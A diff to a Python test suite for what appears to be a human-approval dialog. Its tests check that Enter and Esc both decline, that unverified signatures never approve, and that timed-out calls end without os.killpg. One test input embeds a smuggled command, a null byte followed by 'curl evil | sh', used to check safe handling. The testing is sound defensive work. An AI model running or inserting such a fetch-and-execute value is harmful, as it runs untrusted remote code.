@@ -401,6 +401,11 @@ def test_the_real_script_parses_and_its_window_builds_without_showing():
     assert b"errors=0" in out.stdout, out.stdout
     built = hello.build_window_only(_request(review_text="make test\x00; curl evil | sh"))
     assert built["choice"] == "built"
+    # ENTER AND ESC BOTH DECLINE. Enter-to-approve is the dangerous regression
+    # — one keypress in the wrong window approves — and only the real form can
+    # say which button each key is bound to.
+    assert built["accept"] is True, "Enter must be bound to Decline"
+    assert built["cancel"] is True, "Esc must be bound to Decline"
 
 
 def test_a_signature_that_does_not_verify_locally_is_never_an_approval(fake):
@@ -413,3 +418,37 @@ def test_a_signature_that_does_not_verify_locally_is_never_an_approval(fake):
               pubkey={"status": "Success", "spki": base64.b64encode(REAL_SPKI).decode()})
     assert hello.open_window(_request()) == {"choice": "unavailable",
                                              "reason": "SignatureMismatch"}
+
+
+def test_without_killpg_the_fallback_still_ends_the_call(fake, monkeypatch):
+    """Where `os.killpg` does not exist (native Windows, or a platform that
+    lacks it), `_end_group` falls back to `proc.kill()`: the call still ends at
+    its deadline and the request still EXPIRES rather than hanging or
+    raising."""
+    import subprocess
+
+    monkeypatch.setattr(hello, "WINDOW_DEADLINE", 1.5)
+    monkeypatch.delattr(hello.os, "killpg")
+    started = []
+    real_popen = subprocess.Popen
+
+    def popen(*args, **kwargs):
+        proc = real_popen(*args, **kwargs)
+        started.append(proc)
+        return proc
+
+    monkeypatch.setattr(hello.subprocess, "Popen", popen)
+    fake.plan(window="silent")
+    began = time.monotonic()
+    try:
+        assert hello.open_window(_request()) == {"choice": "expired"}
+        assert time.monotonic() - began < 6
+        assert started and started[0].poll() is not None, "the call's process ended"
+    finally:
+        # The fake's own child is not in reach of proc.kill(); end it by the
+        # pid it recorded, which this test started.
+        if fake.child_file.exists():
+            try:
+                os.kill(int(fake.child_file.read_text()), 9)
+            except (ProcessLookupError, ValueError):
+                pass
